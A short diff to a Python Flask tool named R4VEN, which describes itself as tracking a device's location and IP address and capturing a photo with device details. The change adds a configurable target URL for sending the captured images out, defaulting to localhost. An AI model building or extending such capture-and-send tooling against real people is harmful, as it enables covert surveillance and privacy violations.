@@ -89,8 +89,9 @@ app = Flask(__name__)
 
 parser = argparse.ArgumentParser(
     description="R4VEN - Track device location, and IP address, and capture a photo with device details.",
-    usage=f"{sys.argv[0]} [-p port]"
+    usage=f"{sys.argv[0]} [-t target] [-p port]"
 )
+parser.add_argument("-t", "--target", nargs="?", help="the target url to send the captured images to", default="http://localhost:8000/image")
 parser.add_argument("-p", "--port", nargs="?", help="port to listen on", default=8000)
 args = parser.parse_args()
 
